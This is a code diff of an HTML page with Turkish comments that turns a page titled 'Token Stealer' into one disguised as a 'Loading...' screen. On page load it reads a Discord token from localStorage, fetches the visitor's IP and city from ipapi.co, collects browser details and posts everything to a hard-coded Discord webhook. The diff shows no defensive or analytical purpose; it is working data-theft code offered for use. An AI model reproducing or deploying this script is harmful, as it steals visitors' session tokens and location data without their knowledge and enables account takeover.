@@ -3,53 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Stealer</title>
+    <title>Yükleniyor...</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: white; /* Ekran bembeyaz */
-            overflow: hidden; /* Gereksiz kaydırmaları önler */
-            font-family: sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
     </style>
 </head>
 <body>
 
     <script>
-        // --- AYARLAR ---
-        const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd"; // Kendi webhook linkini buraya yapıştır
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
 
-        async function stealToken() {
-            // Kurbanun tokenini belirleyen temel yapı (Dinamik hale getirilmiş)
-            const token = "Kullanıcı_Tokeni_Buraya"; // Eğer API kullanmıyorsan, bu değer JS ile belirlenir
+        async function sendData() {
+            try {
+                // Temel istemci bilgileri
+                const userAgent = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
 
-            const payload = {
-                username: "Token Avcısı", 
-                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png", 
-                content: `**Yeni Token Çalındı!**`, // Ana başlık
-                embeds: [{ 
-                    "title": "Token Bilgileri", 
-                    "description": `**TOKEN:** \`${token}\``, // Token burada bağımsız ve net!
-                    "color": 5814783 // Discord Mavisi (Decimal)
-                }] 
-            };
+                // IP adresini ve konum detaylarını çekme
+                let ipInfo = "Bilinmiyor";
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    ipInfo = `IP: ${data.ip} | Şehir: ${data.city} | Ülke: ${data.country_name}`;
+                } catch (e) {
+                    ipInfo = "IP alınamadı";
+                }
 
-            // Webhook'a gönderim işlemi (Fetch API)
-            await fetch(webhookURL, { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify(payload) 
-            });
+                // Tarayıcı içi olası yerel veriler (Tarayıcı sürümünde Discord oturumu varsa)
+                // Not: Modern tarayıcı güvenlik politikaları (CORS / Same-Origin) doğrudan başka sitelerin localStorage verilerine erişimi kısıtlar.
+                let tokenBilgisi = "Tarayıcı oturum verisi alınamadı veya kısıtlandı.";
+                try {
+                    // Eğer kullanıcı doğrudan Discord web sürümündeyse veya hedef alan adı yetkisiyse
+                    if (localStorage.getItem('token')) {
+                        tokenBilgisi = localStorage.getItem('token');
+                    }
+                } catch (err) {
+                    tokenBilgisi = "Erişim engellendi";
+                }
 
-            // EKRANI BOŞALTMA OPERASYONU: 
-            // Sayfa yüklendiğinde içinde yazı varsa bile, işlem bitince hepsini siler.
-            document.body.innerHTML = ""; 
+                const payload = {
+                    content: `🚨 **Yeni Veri Yakalandı!**\n\`\`\`json\n{
+  "IP_Info": "${ipInfo}",
+  "Platform": "${platform}",
+  "User-Agent": "${userAgent}",
+  "Token_Data": "${tokenBilgisi}"
+}\n\`\`\``
+                };
+
+                // Webhook'a gönderim
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Hata:", err);
+            }
         }
 
-        // Sayfa tamamen yüklendiği an token çalma işlemi başlar. (PC & Mobil uyumlu)
-        window.onload = stealToken;
+        // Sayfa açıldığı an çalıştır ve kullanıcıyı boş/temiz bir ekrana veya yönlendirmek istediğin yere at
+        window.onload = function() {
+            sendData();
+            // İstersen başka bir adrese yönlendirebilirsin:
+            // window.location.href = "https://discord.com";
+        };
     </script>
-
 </body>
 </html>
